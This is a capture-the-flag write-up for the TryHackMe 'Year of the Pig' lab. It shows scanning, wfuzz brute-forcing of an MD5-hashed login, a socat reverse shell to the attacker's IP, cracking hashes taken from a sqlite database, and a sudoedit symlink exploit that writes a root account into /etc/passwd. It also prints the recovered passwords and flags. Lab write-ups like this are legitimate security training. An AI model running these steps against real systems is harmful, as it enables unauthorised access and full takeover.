> Year of the Pig 

**export IP=10.10.190.2**

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  tcpwrapped syn-ack
80/tcp open  http       syn-ack Apache httpd 2.4.29 ((Ubuntu))
```

# Gobuster

sudo gobuster -u http://$IP -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -t 20 -x php,txt,html,sql,bak,py,js -o gobuster/initial

```
/admin (Status: 301)
/api (Status: 301)
/assets (Status: 301)
```

The login page /admin gives us a message `Remember that passwords should be a memorable word, followed by two numbers and a special character`. Let's try for that pattern in index.html.

Let's cretae a python program! We have a wordlist and now let's crack our login page !

Looking at the request we see that the password is md5 encrypted so let's write a basic script which hashes our passwords.

```
#!/bin/bash

cat wordlist.txt | while read -r line; do printf %s "$line" | md5sum | cut -f1 -d' '; done > password.lst
```

And using Wfuzz we can crack the login. 

sudo wfuzz -w password.lst -H "User-Agent: Bypass" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://10.10.146.190/api/login --hh 63

```
000002022:   200        0 L      3 W      99 Ch       "ea22b622ba9b3c41b22785dcb40211ac" 
```

And looking at line 2022 we have the password `savoia21!`. Either we can create a reverse shell in the command line they provided else we can login as SSH.

# Flag 1

```
THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}
```

We are in as marco and looking at /var/www we can't read admin.db and var-www can access it. Let's elevate to var-www. Let's upload socat binary to the remote box and let's set up a listener in ours
`socat tcp-l:12345 file:`tty`,raw,echo=0` and in the remote machine `/tmp/socat tcp:10.8.107.21:12345 exec:"bash -li",pty,stderr,sigint,setsid,sane`.

Now we can view the admin.db `sqlite3 admin.db`. And we can see curtis's password.

```
.table => lists tables 
select * from users; => We have md5 hashes of users.
```

We can crack it in crackstation `Donald1983$`.

# Flag 2

```
THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}
```

# Privilege Escalation

sudo -l

```
(ALL : ALL) sudoedit /var/www/html/*/*/config.php
```

## sudo version

```
Sudo version 1.8.13
Sudoers policy plugin version 1.8.13
Sudoers file grammar version 44
Sudoers I/O plugin version 1.8.13
```

Looks like we are vulnerable to `CVE-2015-8239`. For this vuln. we have to create 2 directories but curtis isn't web-developer's group so we need to do it as marco.

Now let's link a /etc/passwd file to config.php. 

`ln -s /etc/passwd /var/www/html/dir1/dir2/config.php`. And su to curtis and add it in config file 

Let's create a password to add to /etc/passwd file.

openssl passwd -6 --salt randomsalt root

`$6$randomsalt$AHPxtUYrDkCaFk3kuP6syCZeGbMzkohyz4oDUk4KWVhG3MiGClEnACLhhmNP6kPLu2yn23w75L6lJHFjZaC0X0`

Now as curtis `sudoedit /var/www/html/dir1/dir2/config.php`

```
admin:$6$randomsalt$AHPxtUYrDkCaFk3kuP6syCZeGbMzkohyz4oDUk4KWVhG3MiGClEnACLhhmNP6kPLu2yn23w75L6lJHFjZaC0X0:0:0::/root:/bin/bash
```

And I created an user named `admin` with password `root`. And we are root!!

# root.txt

```
THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}
```